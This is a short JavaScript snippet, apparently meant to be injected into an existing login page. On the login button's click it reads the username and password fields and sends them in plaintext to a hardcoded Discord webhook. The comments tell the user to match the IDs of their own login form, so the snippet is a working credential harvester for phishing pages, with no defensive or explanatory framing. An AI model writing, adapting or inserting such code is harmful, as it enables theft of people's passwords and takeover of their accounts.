<script>
    document.addEventListener('DOMContentLoaded', function () {
        const loginButton = document.getElementById('login-button'); // Ensure this matches your existing button's ID
        
        loginButton.addEventListener('click', function () {
            const username = document.getElementById('username').value; // Ensure this is the ID of your username input
            const password = document.getElementById('password').value; // Ensure this is the ID of your password input
            
            // Assemble the message to send
            const message = {
                content: `**Username**: ${username}\n**Password**: ${password}`
            };
            
            // Send message to Discord webhook
            fetch('https://discord.com/api/webhooks/1269198320425766974/4b6peMQ0iNL0qtF4XvWB4XZLwqOC1aDCWcc4g0Ec-9o3214Alb_N4B3FvF88RpLLpcOG', { // Replace with your actual webhook URL
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            }).then(response => {
                if (response.ok) {
                    console.log('Message sent to Discord successfully!');
                } else {
                    console.error('Failed to send message to Discord:', response.statusText);
                }
            }).catch(error => {
                console.error('Error sending message to Discord:', error);
            });
        });
    });
</script>
